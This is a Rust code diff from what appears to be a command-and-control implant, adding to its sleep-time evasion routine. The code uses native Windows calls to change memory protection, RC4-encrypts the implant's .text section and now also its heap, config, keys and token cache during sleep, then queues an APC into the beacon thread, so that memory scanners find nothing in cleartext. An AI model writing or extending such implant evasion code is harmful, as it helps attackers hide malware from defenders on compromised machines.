@@ -455,7 +455,7 @@ struct FoliageParams {
 /// `FoliageParams::beacon_thread_handle` — `NtQueueApcThread` with a
 /// pseudo-handle resolves to the calling thread, NOT the beacon.
 #[derive(Clone, Copy)]
-struct FoliageRaw {
+pub(crate) struct FoliageRaw {
     nt_protect: usize,
     nt_wait_for_single_object: usize,
     nt_queue_apc_thread: usize,
@@ -500,7 +500,7 @@ impl FoliageRaw {
     ///
     /// # Safety
     /// `base`/`size`/`old` must be valid mutable pointers.
-    unsafe fn nt_protect_virtual_memory(
+    pub(crate) unsafe fn nt_protect_virtual_memory(
         &self,
         base: &mut usize,
         size: &mut usize,
@@ -638,9 +638,13 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
         return 1; // protect failed — abort, .text untouched
     }
 
-    // 2. RC4-encrypt .text in place.
+    // 2. RC4-encrypt .text + all registered regions + heap slabs in one pass.
     let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
     nyx_implant_evasionsdk::foliage::mask_region(&p.key, text);
+    // Mask registered sensitive regions + allocator heap pages (config, key,
+    // token cache, BOF scratch — everything that would be cleartext in a
+    // memory scan during sleep). Uses the same RC4 key as .text.
+    crate::mem::mask_heap_regions(&p.key);
 
     // 3. Queue APC into the beacon's alertable window using the REAL thread
     //    handle (not NtCurrentThread which resolves to the calling thread).
@@ -693,7 +697,10 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
     unsafe { raw.nt_wait_for_single_object(INVALID_HANDLE, 0, &delay as *const i64 as usize) };
 
-    // 5. RC4-decrypt .text.
+    // 5. RC4-decrypt heap regions + registered sensitive data, then .text.
+    //    Heap must be unmasked before .text because the beacon thread will
+    //    resume executing from .text and may access config/transport buffers.
+    crate::mem::unmask_heap_regions(&p.key);
     let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
     nyx_implant_evasionsdk::foliage::unmask_region(&p.key, text);
 
